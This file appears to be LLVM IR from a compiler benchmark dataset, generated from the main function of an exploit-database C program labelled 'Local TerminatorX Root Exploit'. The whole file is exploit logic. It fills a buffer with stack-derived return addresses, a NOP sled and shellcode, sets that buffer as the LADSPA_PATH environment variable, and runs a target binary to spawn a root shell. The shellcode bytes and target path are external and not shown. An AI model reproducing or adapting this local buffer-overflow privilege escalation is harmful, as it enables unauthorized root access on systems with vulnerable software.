; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23351.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23351.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFERSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [49 x i8] c"\0A**********************************************\0A\00", align 1
@.str.1 = private unnamed_addr constant [33 x i8] c"\09Local TerminatorX Root Exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"\09Coded By Bobby of FBH\0A\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c"\09Using Ret at --> 0x%x\0A\00", align 1
@.str.4 = private unnamed_addr constant [50 x i8] c"\0A**********************************************\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"Spawing Shell....\0A\0A\00", align 1
@NOP = common dso_local global i8 0, align 1
@shellcode = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [12 x i8] c"LADSPA_PATH\00", align 1
@BINARY = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [6 x i8] c"execl\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32*, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @BUFFERSIZE, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %6, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %7, align 8
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %16, 2
  br i1 %17, label %18, label %20

18:                                               ; preds = %2
  %19 = call i32 (...) @getesp()
  store i32 %19, i32* %8, align 4
  br label %27

20:                                               ; preds = %2
  %21 = call i32 (...) @getesp()
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @atoi(i8* %24)
  %26 = sub nsw i32 %21, %25
  store i32 %26, i32* %8, align 4
  br label %27

27:                                               ; preds = %20, %18
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  %31 = load i32, i32* %8, align 4
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 %31)
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.4, i64 0, i64 0))
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0))
  %35 = call i32 @sleep(i32 2)
  %36 = bitcast i8* %15 to i32*
  store i32* %36, i32** %10, align 8
  store i32 0, i32* %9, align 4
  br label %37

37:                                               ; preds = %46, %27
  %38 = load i32, i32* %9, align 4
  %39 = load i32, i32* @BUFFERSIZE, align 4
  %40 = sub nsw i32 %39, 1
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %49

42:                                               ; preds = %37
  %43 = load i32, i32* %8, align 4
  %44 = load i32*, i32** %10, align 8
  %45 = getelementptr inbounds i32, i32* %44, i32 1
  store i32* %45, i32** %10, align 8
  store i32 %43, i32* %44, align 4
  br label %46

46:                                               ; preds = %42
  %47 = load i32, i32* %9, align 4
  %48 = add nsw i32 %47, 4
  store i32 %48, i32* %9, align 4
  br label %37

49:                                               ; preds = %37
  %50 = load i32*, i32** %10, align 8
  store i32 0, i32* %50, align 4
  store i32 0, i32* %9, align 4
  br label %51

51:                                               ; preds = %62, %49
  %52 = load i32, i32* %9, align 4
  %53 = load i32, i32* @BUFFERSIZE, align 4
  %54 = sub nsw i32 %53, 1
  %55 = sdiv i32 %54, 2
  %56 = icmp slt i32 %52, %55
  br i1 %56, label %57, label %65

57:                                               ; preds = %51
  %58 = load i8, i8* @NOP, align 1
  %59 = load i32, i32* %9, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %15, i64 %60
  store i8 %58, i8* %61, align 1
  br label %62

62:                                               ; preds = %57
  %63 = load i32, i32* %9, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %9, align 4
  br label %51

65:                                               ; preds = %51
  store i32 0, i32* %11, align 4
  br label %66

66:                                               ; preds = %81, %65
  %67 = load i32, i32* %11, align 4
  %68 = load i8*, i8** @shellcode, align 8
  %69 = call i32 @strlen(i8* %68)
  %70 = icmp slt i32 %67, %69
  br i1 %70, label %71, label %84

71:                                               ; preds = %66
  %72 = load i8*, i8** @shellcode, align 8
  %73 = load i32, i32* %11, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %72, i64 %74
  %76 = load i8, i8* %75, align 1
  %77 = load i32, i32* %9, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %9, align 4
  %79 = sext i32 %77 to i64
  %80 = getelementptr inbounds i8, i8* %15, i64 %79
  store i8 %76, i8* %80, align 1
  br label %81

81:                                               ; preds = %71
  %82 = load i32, i32* %11, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %11, align 4
  br label %66

84:                                               ; preds = %66
  %85 = call i32 @setenv(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0), i8* %15, i32 1)
  %86 = load i32, i32* @BINARY, align 4
  %87 = load i32, i32* @BINARY, align 4
  %88 = call i32 @execl(i32 %86, i32 %87, i32* null)
  %89 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  %90 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %90)
  %91 = load i32, i32* %3, align 4
  ret i32 %91
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @getesp(...) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @execl(i32, i32, i32*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
